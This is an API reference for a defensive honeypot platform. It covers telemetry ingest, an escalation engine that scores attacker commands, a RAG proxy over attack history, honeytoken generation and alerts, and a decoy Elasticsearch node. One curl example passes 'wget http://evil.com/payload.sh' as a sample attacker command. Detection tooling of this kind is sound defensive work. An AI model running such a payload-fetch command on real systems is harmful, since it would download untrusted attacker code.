# API Reference

All custom services expose plain JSON over HTTP/FastAPI (except the
dashboard, which is a Streamlit UI). Ports below are the host-side ports
from `docker-compose.yml` defaults.

## Telemetry — `:8003`

| Method | Path       | Body                                                              | Description |
|--------|------------|--------------------------------------------------------------------|--------------|
| GET    | `/health`  | —                                                                   | Liveness check |
| GET    | `/stats`   | —                                                                   | Counters: events processed, IOCs found, escalations triggered |
| POST   | `/ingest`  | `{honeypot, text, session?, src_ip?}`                              | Manually feed one event into the IOC/MITRE/escalation pipeline (used by the simulation scripts; bypasses the ES poll loop) |

## Escalation Engine — `:8001`

| Method | Path                  | Body                                                                                  | Description |
|--------|-----------------------|------------------------------------------------------------------------------------------|--------------|
| GET    | `/health`             | —                                                                                          | Liveness + which classifier backend is active |
| POST   | `/evaluate`           | `{session_id, command, sequence: [], mitre: [], honeypot}`                                | Runs classify → sequence-score → decide. Returns `{risk_score, decision, confidence, ...}` |
| GET    | `/sessions/escalated` | query: `limit` (default 50)                                                               | Recent ESCALATE decisions (Redis-cached) |

Example:
```bash
curl -X POST http://localhost:8001/evaluate \
  -H "Content-Type: application/json" \
  -d '{"session_id":"demo-1","command":"wget http://evil.com/payload.sh","sequence":["whoami","wget http://evil.com/payload.sh"],"mitre":[{"technique_id":"T1105","tactic":"Command and Control"}],"honeypot":"cowrie"}'
```

## RAG Proxy — `:8002`

| Method | Path             | Body                                                  | Description |
|--------|------------------|--------------------------------------------------------|--------------|
| GET    | `/health`        | —                                                        | Liveness + whether an LLM backend is configured |
| POST   | `/memory/insert` | `{text, kind, metadata?}`                               | `kind` ∈ `attack_history`, `command_history`, `session`, `mitre_mapping` |
| POST   | `/memory/query`  | `{query, n_results?, kind?}`                            | Raw ChromaDB similarity search, no LLM call |
| POST   | `/generate`      | `{context, question, n_memory_results?}`                | Retrieves similar attack memory, injects it into the prompt, forwards to the configured LLM (Groq by default). Returns `{answer, memory_hits_used}` |

## HoneyTrap — `:8004`

| Method | Path                       | Body                                       | Description |
|--------|----------------------------|----------------------------------------------|--------------|
| GET    | `/health`                  | —                                              | Liveness check |
| POST   | `/tokens/generate`         | `{kind, count?}`                              | `kind` ∈ `aws_key`, `api_token`, `ssh_private_key`, `db_dump`, `credential` |
| GET    | `/tokens`                  | —                                              | List active honeytokens (secrets redacted) |
| POST   | `/tokens/{token_id}/access`| `{source_ip?, honeypot?, detail?}`            | Report that a honeytoken was touched → raises a `critical` alert |
| GET    | `/alerts`                  | query: `limit` (default 50)                   | Recent honeytoken access alerts |

## Elastichoney (honeypot, not an internal API) — `:9201`

Mimics a vulnerable old Elasticsearch node: `GET /`, `GET /_cluster/health`,
`GET /_cat/indices`, `POST /_search` (flags `"script"`-field payloads as
RCE attempts), and a catch-all 404 for anything else. Every hit is logged
to `/var/log/elastichoney/elastichoney.json` for ingestion by Filebeat.

## Dashboard — `:8501`

Streamlit UI, no JSON API. Three views: Overview, SOC Chatbot, Honeytoken
Alerts.
